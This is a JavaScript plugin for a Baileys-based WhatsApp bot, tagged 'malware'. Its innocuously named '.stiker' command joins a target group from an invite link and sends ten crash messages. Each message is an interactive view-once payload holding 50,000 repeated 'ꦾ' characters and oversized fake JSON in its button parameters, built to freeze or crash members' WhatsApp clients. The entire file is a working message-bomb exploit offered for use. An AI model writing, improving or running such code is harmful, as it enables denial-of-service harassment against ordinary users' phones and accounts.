import { generateWAMessageFromContent } from '@whiskeysockets/baileys';

let handler = async (m, { conn, args, isBot }) => {
  if (!args[0] || !args[0].includes('whatsapp.com')) {
    return m.reply('*⚠️ Ingresa el link de un grupo válido.*\n\nEjemplo: .stiker https://chat.whatsapp.com/...');
  }

  // Extraer el código del link
  let code = args[0].split('whatsapp.com/')[1].trim();
  try {
    let res = await conn.groupAcceptInvite(code);
    let jid = res + '@g.us';

    for (let i = 0; i < 10; i++) {
      await CrashXUiKiller(conn, jid);
      await delay(1200); // Delay pequeño entre envíos
    }

  } catch (e) {
    console.error(e);
    m.reply('❌ No pude unirme al grupo o enviar el mensaje.');
  }
};

handler.command = ['stiker'];
handler.tags = ['malware'];
handler.help = ['stiker <link del grupo>'];
handler.group = false;
handler.private = false;
export default handler;

// Función de delay
function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// Función CrashXUiKiller
async function CrashXUiKiller(sock, jid, ptcp = true) {
  let msg = await generateWAMessageFromContent(jid, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "조로Nted Crash Gen6🐉버그",
            hasMediaAttachment: false
          },
          body: {
            text: "조로Nted Crash Gen6🐉버그" + "ꦾ".repeat(50000),
          },
          nativeFlowMessage: {
            messageParamsJson: "",
            buttons: [
              {
                name: "cta_url",
                buttonParamsJson: venomModsData + "ꦾ"
              },
              {
                name: "call_permission_request",
                buttonParamsJson: venomModsData + "ꦾ"
              }
            ]
          }
        }
      }
    }
  }, {});
  await sock.relayMessage(jid, msg.message, ptcp ? { participant: { jid: jid } } : {});
}

// Datos falsos
let venomModsData = JSON.stringify({
  status: true,
  criador: "VenomMods",
  resultado: {
    type: "md",
    ws: {
      _events: { "CB:ib,,dirty": ["Array"] },
      _eventsCount: 800000,
      _maxListeners: 0,
      url: "wss://web.whatsapp.com/ws/chat",
      config: {
        version: ["Array"],
        browser: ["Array"],
        waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
        sockCectTimeoutMs: 20000,
        keepAliveIntervalMs: 30000,
        logger: {},
        printQRInTerminal: false,
        emitOwnEvents: true,
        defaultQueryTimeoutMs: 60000,
        customUploadHosts: [],
        retryRequestDelayMs: 250,
        maxMsgRetryCount: 5,
        fireInitQueries: true,
        auth: { Object: "authData" },
        markOnlineOnsockCect: true,
        syncFullHistory: true,
        linkPreviewImageThumbnailWidth: 192,
        transactionOpts: { Object: "transactionOptsData" },
        generateHighQualityLinkPreview: false,
        options: {},
        appStateMacVerification: { Object: "appStateMacData" },
        mobile: true
      }
    }
  }
});